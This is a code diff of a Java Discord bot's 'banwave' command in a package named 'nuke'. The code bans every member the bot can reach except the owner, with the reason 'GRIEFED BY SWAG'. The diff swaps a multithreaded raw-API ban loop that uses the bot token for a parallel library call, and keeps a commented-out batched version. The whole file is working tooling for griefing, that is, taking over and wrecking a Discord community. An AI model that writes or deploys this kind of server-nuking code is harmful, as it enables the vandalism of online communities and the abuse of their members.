@@ -1,22 +1,13 @@
 package me.comu.exeter.commands.nuke;
 
-import me.comu.exeter.core.Config;
 import me.comu.exeter.core.Core;
 import me.comu.exeter.interfaces.ICommand;
 import me.comu.exeter.logging.Logger;
 import net.dv8tion.jda.api.entities.ISnowflake;
 import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.RequestBody;
-import okhttp3.Response;
 
-import java.io.IOException;
 import java.util.Arrays;
 import java.util.List;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
-import java.util.stream.Collectors;
 
 public class BanwaveCommand implements ICommand {
 
@@ -27,35 +18,21 @@ public class BanwaveCommand implements ICommand {
         }
 
         Logger.getLogger().print("Initiating Ban Wave...");
-        List<String> members = event.getGuild().getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member))).map(ISnowflake::getId).collect(Collectors.toList());
-// Lists.partition(members, 25).parallelStream().forEach({
-//
-//                };
-            ExecutorService executorService = Executors.newFixedThreadPool(15);
-        Runnable wave = () -> {
-            for (String member : members) {
-                OkHttpClient client = new OkHttpClient();
-                Request request = new Request.Builder()
-                        .url(String.format("https://discord.com/api/v7/guilds/%s/bans/%s", event.getGuild().getId(), member))
-                        .put(RequestBody.create(null, ""))
-                        .addHeader("Authorization", "Bot " + Config.get("TOKEN"))
-                        .build();
-                try {
-                    Response response = client.newCall(request).execute();
-                    if (response.isSuccessful()) {
-                        Logger.getLogger().print("Banned " + member + "\n" + response.body() + "\n");
-                    } else {
-                        Logger.getLogger().print(response.message());
-                    }
-
-                } catch (IOException ex) {
-                    ex.printStackTrace();
-                }
-            }
-        };
-        for (int i = 0; i < 15; i++) {
-            executorService.submit(wave);
-        }
+        event.getGuild().getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member))).map(ISnowflake::getId).parallel().forEach(member -> event.getGuild().ban(member, 0, "GRIEFED BY SWAG").queue());
+        /*List<List<String>> partitionLists = Lists.partition(members, 4);
+        List<String> wave1members = new ArrayList<>(partitionLists.get(0));
+        List<String> wave2members = new ArrayList<>(partitionLists.get(1));
+        List<String> wave3members = new ArrayList<>(partitionLists.get(2));
+        List<String> wave4members = new ArrayList<>(partitionLists.get(3));
+        ExecutorService executorService = Executors.newFixedThreadPool(4);
+        Runnable wave1 = () -> wave1members.forEach((member) -> event.getGuild().ban(member, 0, "GRIEFED BY SWAG").queue();
+        Runnable wave2 = () -> wave2members.forEach((member) -> event.getGuild().ban(member, 0, "GRIEFED BY SWAG").queue();
+        Runnable wave3 = () -> wave3members.forEach((member) -> event.getGuild().ban(member, 0, "GRIEFED BY SWAG").queue();
+        Runnable wave4 = () -> wave4members.forEach((member) -> event.getGuild().ban(member, 0, "GRIEFED BY SWAG").queue();
+        executorService.submit(wave1);
+        executorService.submit(wave2);
+        executorService.submit(wave3);
+        executorService.submit(wave4);*/
 
 
     }
